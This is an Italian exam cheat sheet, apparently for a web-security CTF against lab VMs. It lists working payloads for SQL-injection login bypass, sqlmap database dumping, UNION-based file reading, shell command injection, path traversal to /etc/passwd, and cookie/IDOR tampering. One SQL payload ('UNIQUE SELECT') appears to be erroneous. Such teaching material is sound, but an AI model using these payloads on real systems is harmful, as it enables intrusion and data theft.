# Repository di Supporto - Esame Cybersecurity 2026 (Web Security)

## INDICE DEGLI ESERCIZI
1. [Esercizio 1: Recon & Fuzzing (Identificazione Pagine Nascoste)](#1)
2. [Esercizio 2: SQL Injection (Bypass Login Form)](#2)
3. [Esercizio 3: SQL Injection (Estrazione Dati Automatica con SQLMap)](#3)
4. [Esercizio 4: SQL Injection Manuale (UNION Based & File Reading)](#4)
5. [Esercizio 5: Command Injection (Esecuzione Comandi e Reverse Shell)](#5)
6. [Esercizio 6: Local File Inclusion & Path Traversal (Lettura File di Sistema)](#6)
7. [Esercizio 7: Broken Authentication & IDOR (Manipolazione Cookie e ID)](#7)

## Metodologia Generale CTF Web
- Trova l'IP della VM target.
- Identifica la vulnerabilità principale partendo dal punto 1 (Fuzzing).
- Esegui i payload specifici per estrarre la flag nel formato `cysec{...}`.

---
## 1
Mappatura dell'applicazione alla ricerca di file dimenticati, backup o directory nascoste (es. config.php.bak, flag.txt, admin.php).

```bash
# 1. Ispezione Rapida con Curl (mostra intestazioni HTTP e cookie)
curl -i http://TARGET_IP/

# 2. Directory Brute-Forcing con DIRB (se disponibile)
dirb http://TARGET_IP/ /usr/share/wordlists/dirb/common.txt

# 3. Directory Brute-Forcing con Gobuster (estensioni sensibili)
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,html
```
---

---
## 2
Bypass del controllo credenziali nei form di Login (Authentication Bypass).

```sql
-- Inserire uno dei seguenti payload direttamente nei campi Username o Password della pagina web:

' OR 1=1 -- -
' OR '1'='1
admin' -- -
admin' #
' UNIQUE SELECT 1 -- -
```
---

---
## 3
Automazione dell'estrazione di tabelle e flag da un parametro vulnerabile a SQL Injection (es: `?id=1`).

```bash
# 1. Identificazione automatica ed estrazione dei Database presenti
sqlmap -u "http://TARGET_IP/index.php?id=1" --dbs --batch

# 2. Estrazione delle tabelle dal database mirato (sostituire 'cysec_db')
sqlmap -u "http://TARGET_IP/index.php?id=1" -D cysec_db --tables --batch

# 3. Dump del contenuto della tabella contenente i dati sensibili (es: 'flags')
sqlmap -u "http://TARGET_IP/index.php?id=1" -D cysec_db -T flags --dump --batch
```
---

---
## 4
Sfruttamento manuale di una vulnerabilità SQLi quando sqlmap non è utilizzabile o si richiede la lettura di un file locale.

```sql
-- 1. Determinare il numero di colonne della query originale
' ORDER BY 1 -- -
' ORDER BY 2 -- -

-- 2. Individuare quali colonne stampano l'output a schermo
' UNION SELECT 1,2,3 -- -

-- 3. Enumerare i nomi delle tabelle del database corrente
' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- -

-- 4. Leggere un file direttamente dal file system (es: flag.txt nel webroot)
' UNION SELECT null, LOAD_FILE('/var/www/html/flag.txt') -- -
```
---

---
## 5
Esecuzione di comandi di sistema sul server tramite input non sanificati (es: form di utility Ping, Tracciamenti).

```bash
# Concatenare i comandi usando i delimitatori di Bash nell'input del form:

# Variante A (Punto e virgola)
8.8.8.8 ; cat /flag.txt

# Variante B (AND logico)
8.8.8.8 && cat flag.txt

# Variante C (Iniezione in-line)
$(cat /flag.txt)

# Comandi utili post-compromissione per la ricognizione interna:
whoami
ls -la
find / -name "*flag*" 2>/dev/null
```
---

---
## 6
Lettura di file arbitrari al di fuori della cartella web root manipolando i parametri di inclusione file (es: `?page=`).

```bash
# 1. Path Traversal classico per verificare la vulnerabilità
http://TARGET_IP/index.php?page=../../../../etc/passwd

# 2. Lettura diretta della flag nei percorsi standard
http://TARGET_IP/index.php?page=../../../../flag.txt
http://TARGET_IP/index.php?page=../../../../var/www/html/flag.txt
http://TARGET_IP/index.php?page=../../../../home/studente/flag.txt

# 3. Bypass filtri deboli (raddoppio dei caratteri di escape)
http://TARGET_IP/index.php?page=....//....//....//flag.txt

# 4. PHP Wrapper per leggere sorgenti PHP senza eseguirli (restituisce Base64)
http://TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=config.php
# Decodifica su terminale locale: echo "STRINGA_BASE64" | base64 -d
```
---

---
## 7
Manipolazione delle sessioni e scalata dei privileges modificando parametri client-side (Cookie o ID nell'URL).

```text
Metodo Cookie (F12 -> Application/Storage -> Cookies):
1. Individuare cookie di stato (es: user=studente, isAdmin=false, role=user).
2. Modificare i valori in: user=admin, isAdmin=true, role=administrator.
3. Ricaricare la pagina (F5).

Metodo IDOR (Insecure Direct Object Reference):
Se l'URL mostra riferimenti numerici ad oggetti privati (es: ?id=14):
Modificare manualmente il parametro provando valori amministrativi o sequenziali:
- ?id=1
- ?id=0
- ?id=2
